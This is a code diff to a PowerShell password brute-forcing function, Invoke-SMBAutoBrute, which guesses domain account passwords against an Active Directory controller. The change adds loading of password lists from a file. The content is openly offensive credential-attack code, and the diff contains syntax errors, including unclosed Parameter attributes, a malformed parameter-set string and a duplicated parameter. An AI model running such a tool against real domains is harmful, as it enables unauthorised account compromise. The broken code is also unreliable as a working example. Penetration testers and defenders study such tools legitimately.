@@ -65,12 +65,17 @@ function Invoke-SMBAutoBrute
 	The script will exit after the first successful authentication.
 
 #>
-    [CmdletBinding()] Param(
+    [CmdletBinding(defaultParameterSet = "PassList")] Param(
+    
+        [Parameter(ParameterSetName = "PassFile", mandatory=$false]
+	[Parameter(ParameterSetName = "PassList", mandatory=$true]
+	[String]$Passwordlist,
+	
         [Parameter(Mandatory = $False)]
         [String] $UserList,
 
-        [parameter(Mandatory = $True)]
-        [String] $PasswordList,
+        [parameter(ParameterSetName = ""PassFile, Mandatory = $True)]
+        [String] $PasswordFile,
 
         [parameter(Mandatory = $True)]
         [String] $LockoutThreshold,
@@ -204,18 +209,29 @@ function Invoke-SMBAutoBrute
             exit
         }
 
-        Write-Host "[*] PDC: $pdc"
-        Write-Host "[*] Passwords to test: $PasswordList"
+
 
         $dcs = Get-DomainControllers
         $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
         $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)
+	Write-Host "[*] PDC: $pdc"
 
-        $pwds = New-Object System.Collections.ArrayList
-        foreach ($pwd in $PasswordList.Split(','))
-        {
-            $pwds.Add($pwd.Trim(' ')) | Out-Null
-        }
+	$ParamSetName = $PsCmdlet.ParameterSetName
+	if($ParamSetName -eq "PassList"){
+        	$pwds = New-Object System.Collections.ArrayList
+        	foreach ($pwd in $PasswordList.Split(','))
+        	{
+            		$pwds.Add($pwd.Trim(' ')) | Out-Null
+        	}
+        		Write-Host "[*] Passwords to test: $PasswordList"
+	} else {
+		$PassFileLength = (get-content $PasswordFile).Length
+		$pwds = New-Object System.Collections.ArrayList
+		foreach ($pwd in Get-Content $PasswordFile){
+			$pwds.Add($pwd) | Out-Null
+			}
+		Write-Host "[*] Number of Passwords loaded from file: $PassFileLength"
+	}
 
         Write-Host "[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show..."
         foreach ($p in $pwds)
